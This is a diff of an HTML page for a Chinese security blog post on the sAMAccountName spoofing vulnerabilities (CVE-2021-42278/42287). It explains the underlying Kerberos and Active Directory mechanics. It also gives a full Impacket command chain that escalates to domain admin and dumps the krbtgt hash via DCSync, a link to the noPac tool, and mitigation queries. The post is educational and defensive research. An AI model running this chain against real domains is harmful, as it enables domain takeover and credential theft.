@@ -18,7 +18,7 @@
 <meta name="application-name" content="Geekby&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/12/samaccountname-spoofing/" /><link rel="prev" href="https://www.geekby.site/2021/12/api%E5%AE%89%E5%85%A8/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/12/samaccountname-spoofing/" /><link rel="prev" href="https://www.geekby.site/2021/11/k8s%E5%AE%89%E5%85%A8/" /><link rel="next" href="https://www.geekby.site/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -27,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/www.geekby.site\/2021\/12\/samaccountname-spoofing\/"
-        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "域安全, 内网渗透","wordcount":  292 ,
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "域安全, 内网渗透","wordcount":  381 ,
         "url": "https:\/\/www.geekby.site\/2021\/12\/samaccountname-spoofing\/","datePublished": "2021-12-12T16:31:00+08:00","dateModified": "2021-12-12T16:31:00+08:00","publisher": {
             "@type": "Organization",
             "name": "Geekby","logo": {
@@ -109,7 +109,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">sAMAccountName spoofing</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw"></i>内网渗透</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-12-12">2021-12-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 292 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-12-12">2021-12-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 381 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
@@ -122,13 +122,16 @@
       <ul>
         <li><a href="#11-cve-2021-42278">1.1 CVE-2021-42278</a></li>
         <li><a href="#12-cve-2021-42287">1.2 CVE-2021-42287</a></li>
+        <li><a href="#13-samaccountname">1.3 sAMAccountName</a></li>
+        <li><a href="#14-sam-account-type">1.4 SAM-Account-Type</a></li>
       </ul>
     </li>
     <li><a href="#2-漏洞复现">2 漏洞复现</a></li>
     <li><a href="#3-缓解措施">3 缓解措施</a></li>
+    <li><a href="#参考">参考</a></li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><h1 id="samaccountname-spoofing">sAMAccountName spoofing</h1>
+            </div><div class="content" id="content"><h1 id="sam-accountname-spoofing">SAM-AccountName spoofing</h1>
 <h2 id="1-背景">1 背景</h2>
 <blockquote>
 <p>2021 年 11 月，有两个漏洞 CVE-2021-42278 &amp; CVE-2021-42287 被露，两个漏洞组合可导致域内普通用户权限提升至域管权限。</p>
@@ -139,6 +142,36 @@
 <p>在 kerberos 认证过程中，用户要访问某个服务，在获取服务票据 ST 之前，需要申请 TGT票据。该漏洞的核心为：当请求的服务票 ST 没有被 KDC 找到时，KDC 会自动在尾部添加 <code>$</code> 重新搜索。</p>
 <p>如果 A 用户获得申请了 TGT，然后删除 A 用户或重命名 A 用户。并使用该 TGT 进行 <code>S4U2self</code> 以其它用户身份请求一张 ST 给他自己，导致 KDC 在 Account Database 中寻找 <code>A$</code>。如果帐户 <code>A$</code> 存在，那么 <code>A</code> 就会像其他用户一样为 <code>A$</code>获得一张服务票据。</p>
 <p>因此，机器账户改名为和 DC 机器账户一样，然后申请 TGT，接着把用户名修改掉，使得 DC 在 <code>TGS_REP</code> 时候找不到该账户，这时会用自己的密钥加密服务票据 ST，然后就是得到了一个高权限 ST。</p>
+<h3 id="13-samaccountname">1.3 sAMAccountName</h3>
+<p>根据微软<a href="https://docs.microsoft.com/zh-cn/windows/win32/adschema/a-samaccountname?redirectedfrom=MSDN" target="_blank" rel="noopener noreffer">官方文档</a>中的定义：</p>
+<blockquote>
+<p>SAM-Account-Name 用于支持运行早期版本操作系统的客户端和服务器的登录名，例如 Windows NT 4.0、Windows 95、Windows 98 和 LAN Manager。实际上是以「Domain\LogonName 」形式命名。</p>
+</blockquote>
+<p>其 Ldap-Display-Name 为：sAMAccountName。故该组合漏洞又被称为：<code>sAMAccountName spoofing</code></p>
+<p>此处还有一种用户命名属性，是目前域环境中常用的一种：<code>UPN</code></p>
+<blockquote>
+<p><strong>userPrincipalName</strong> 属性是用户的登录名。 属性由 UPN (用户主体) ，这是用户最常见的登录 Windows 名称。 用户通常使用其 UPN 登录到域。</p>
+<p>UPN 由 UPN 前缀（用户帐户名）和 UPN 后缀（DNS 域名）组成。 前缀与后缀以 <code>@</code> 符号相联接。UPN 必须在目录林中的所有安全主体对象之间保持唯一。 这意味着可以重复使用 UPN 的前缀，只是不能使用相同的后缀。</p>
+</blockquote>
+<p>例如：</p>
+<ul>
+<li>域名：<code>pentest.lab</code></li>
+<li>SAM-Account-Name：<code>win11user</code></li>
+<li>NetBIOS 登录名：<code>pentest.lab\win11user</code></li>
+<li>UserPrincipalName：<code>win11user@pentest.lab</code></li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171553067.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171553067.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171553067.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171553067.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171553067.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171553067.png-water_print" /></p>
+<h3 id="14-sam-account-type">1.4 SAM-Account-Type</h3>
+<blockquote>
+<p><a href="https://docs.microsoft.com/zh-cn/windows/win32/adschema/a-samaccounttype" target="_blank" rel="noopener noreffer">SAM-Account-Type</a> 包含了域内帐户类型对象的信息。可以枚举帐户类型的列表，也可以使用显示信息 API 来创建列表。由于计算机、普通用户帐户和信任帐户还可以枚举为用户对象。</p>
+</blockquote>
 <h2 id="2-漏洞复现">2 漏洞复现</h2>
 <blockquote>
 <p>前提：需要对属性 <code>sAMAccountName</code> 和  <code>servicePrincipalName</code> 具有写权限。由于默认情况下 <a href="https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota" target="_blank" rel="noopener noreffer">MAQ</a> 特性，域内普通用户可以创建 10 个机器账户，而创建者对于机器账户具有写权限，当然可以更改这两个属性。</p>
@@ -187,27 +220,27 @@
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 0. create a computer account</span>
-addcomputer.py -computer-name <span class="s1">&#39;ControlledComputer$&#39;</span> -computer-pass <span class="s1">&#39;ComputerPassword&#39;</span> -dc-host DC01 -domain-netbios domain <span class="s1">&#39;domain.local/user1:complexpassword&#39;</span>
-
-<span class="c1"># 1. clear its SPNs</span>
-addspn.py -u <span class="s1">&#39;domain\user&#39;</span> -p <span class="s1">&#39;password&#39;</span> -t <span class="s1">&#39;ControlledComputer$&#39;</span> -c DomainController
-
-<span class="c1"># 2. rename the computer (computer -&gt; DC)</span>
-renameMachine.py -current-name <span class="s1">&#39;ControlledComputer$&#39;</span> -new-name <span class="s1">&#39;DomainController&#39;</span> -dc-ip <span class="s1">&#39;DomainController.domain.local&#39;</span> <span class="s1">&#39;domain.local&#39;</span>/<span class="s1">&#39;user&#39;</span>:<span class="s1">&#39;password&#39;</span>
-
-<span class="c1"># 3. obtain a TGT</span>
-getTGT.py -dc-ip <span class="s1">&#39;DomainController.domain.local&#39;</span> <span class="s1">&#39;domain.local&#39;</span>/<span class="s1">&#39;DomainController&#39;</span>:<span class="s1">&#39;ComputerPassword&#39;</span>
-
-<span class="c1"># 4. reset the computer name</span>
-renameMachine.py -current-name <span class="s1">&#39;DomainController&#39;</span> -new-name <span class="s1">&#39;ControlledComputer$&#39;</span> <span class="s1">&#39;domain.local&#39;</span>/<span class="s1">&#39;user&#39;</span>:<span class="s1">&#39;password&#39;</span>
-
-<span class="c1"># 5. obtain a service ticket with S4U2self by presenting the previous TGT</span>
-<span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s1">&#39;DomainController.ccache&#39;</span> getST.py -self -impersonate <span class="s1">&#39;DomainAdmin&#39;</span> -spn <span class="s1">&#39;cifs/DomainController.domain.local&#39;</span> -k -no-pass -dc-ip <span class="s1">&#39;DomainController.domain.local&#39;</span> <span class="s1">&#39;domain.local&#39;</span>/<span class="s1">&#39;DomainController&#39;</span>
-
-<span class="c1"># 6. DCSync by presenting the service ticket</span>
-<span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s1">&#39;DomainAdmin.ccache&#39;</span> secretsdump.py -just-dc-user <span class="s1">&#39;krbtgt&#39;</span> -k -no-pass -dc-ip <span class="s1">&#39;DomainController.domain.local&#39;</span> @<span class="s1">&#39;DomainController.domain.local&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 0. create a computer account</span>
+</span></span><span class="line"><span class="cl">addcomputer.py -computer-name <span class="s1">&#39;ControlledComputer$&#39;</span> -computer-pass <span class="s1">&#39;ComputerPassword&#39;</span> -dc-host DC01 -domain-netbios domain <span class="s1">&#39;domain.local/user1:complexpassword&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 1. clear its SPNs</span>
+</span></span><span class="line"><span class="cl">addspn.py -u <span class="s1">&#39;domain\user&#39;</span> -p <span class="s1">&#39;password&#39;</span> -t <span class="s1">&#39;ControlledComputer$&#39;</span> -c DomainController
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 2. rename the computer (computer -&gt; DC)</span>
+</span></span><span class="line"><span class="cl">renameMachine.py -current-name <span class="s1">&#39;ControlledComputer$&#39;</span> -new-name <span class="s1">&#39;DomainController&#39;</span> -dc-ip <span class="s1">&#39;DomainController.domain.local&#39;</span> <span class="s1">&#39;domain.local&#39;</span>/<span class="s1">&#39;user&#39;</span>:<span class="s1">&#39;password&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 3. obtain a TGT</span>
+</span></span><span class="line"><span class="cl">getTGT.py -dc-ip <span class="s1">&#39;DomainController.domain.local&#39;</span> <span class="s1">&#39;domain.local&#39;</span>/<span class="s1">&#39;DomainController&#39;</span>:<span class="s1">&#39;ComputerPassword&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 4. reset the computer name</span>
+</span></span><span class="line"><span class="cl">renameMachine.py -current-name <span class="s1">&#39;DomainController&#39;</span> -new-name <span class="s1">&#39;ControlledComputer$&#39;</span> <span class="s1">&#39;domain.local&#39;</span>/<span class="s1">&#39;user&#39;</span>:<span class="s1">&#39;password&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 5. obtain a service ticket with S4U2self by presenting the previous TGT</span>
+</span></span><span class="line"><span class="cl"><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s1">&#39;DomainController.ccache&#39;</span> getST.py -self -impersonate <span class="s1">&#39;DomainAdmin&#39;</span> -spn <span class="s1">&#39;cifs/DomainController.domain.local&#39;</span> -k -no-pass -dc-ip <span class="s1">&#39;DomainController.domain.local&#39;</span> <span class="s1">&#39;domain.local&#39;</span>/<span class="s1">&#39;DomainController&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 6. DCSync by presenting the service ticket</span>
+</span></span><span class="line"><span class="cl"><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s1">&#39;DomainAdmin.ccache&#39;</span> secretsdump.py -just-dc-user <span class="s1">&#39;krbtgt&#39;</span> -k -no-pass -dc-ip <span class="s1">&#39;DomainController.domain.local&#39;</span> @<span class="s1">&#39;DomainController.domain.local&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>武器化工具地址：<a href="https://github.com/cube0x0/noPac" target="_blank" rel="noopener noreffer">https://github.com/cube0x0/noPac</a></p>
 <p>扫描：<code>noPac.exe scan -domain pentest.lab -user win11user -pass P@ssword</code></p>
@@ -258,8 +291,45 @@ renameMachine.py -current-name <span class="s1">&#39;DomainController&#39;</span
 <h2 id="3-缓解措施">3 缓解措施</h2>
 <ol>
 <li>微软官方已推出补丁：KB5008602、KB5008380</li>
-<li>通过域控的 ADSI 编辑器工具将 AD 域的 MAQ 配置为 0，中断此漏洞的利用链。</li>
+<li>通过域控的 ADSI 编辑器工具将 AD 域的 MAQ 配置为 0，中断此漏洞的利用链（但如果当前用户对域内某台机器账号拥有 <code>GenericALL</code>、<code>GenericWrite</code>、<code>WriteProperty</code> 权限仍能修改 SAMAccountName 属性），具体查询方式如下：</li>
 </ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 列出所有机器账号</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ADComputer</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Property</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">Name</span><span class="p">,</span><span class="n">OperatingSystem</span><span class="p">,</span><span class="n">OperatingSystemServicePack</span><span class="p">,</span><span class="n">OperatingSystemVersion</span> <span class="n">-Wrap</span> <span class="n">-Auto</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># 权限查询</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainObjectAcl</span> <span class="n">ControlledComputer</span> <span class="n">-ResolveGUIDs</span> <span class="p">|?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">securityidentifier</span> <span class="o">-eq</span> <span class="p">(</span><span class="nb">get-domainuser</span> <span class="n">win11user</span><span class="p">).</span><span class="n">objectsid</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171648030.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171648030.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171648030.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171648030.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171648030.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171648030.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171648542.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171648542.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171648542.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171648542.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171648542.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112171648542.png-water_print" /></p>
+<h2 id="参考">参考</h2>
+<ul>
+<li><a href="https://tttang.com/archive/1380/" target="_blank" rel="noopener noreffer">https://tttang.com/archive/1380/</a></li>
+<li><a href="https://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA" target="_blank" rel="noopener noreffer">https://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA</a></li>
+</ul>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
@@ -283,11 +353,12 @@ renameMachine.py -current-name <span class="s1">&#39;DomainController&#39;</span
         </section>
     </div>
 
-    <div class="post-nav"><a href="/2021/12/api%E5%AE%89%E5%85%A8/" class="prev" rel="prev" title="API 安全"><i class="fas fa-angle-left fa-fw"></i>API 安全</a></div>
+    <div class="post-nav"><a href="/2021/11/k8s%E5%AE%89%E5%85%A8/" class="prev" rel="prev" title="K8s 安全"><i class="fas fa-angle-left fa-fw"></i>K8s 安全</a>
+            <a href="/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/" class="next" rel="next" title="Java 代码审计 - 背景">Java 代码审计 - 背景<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
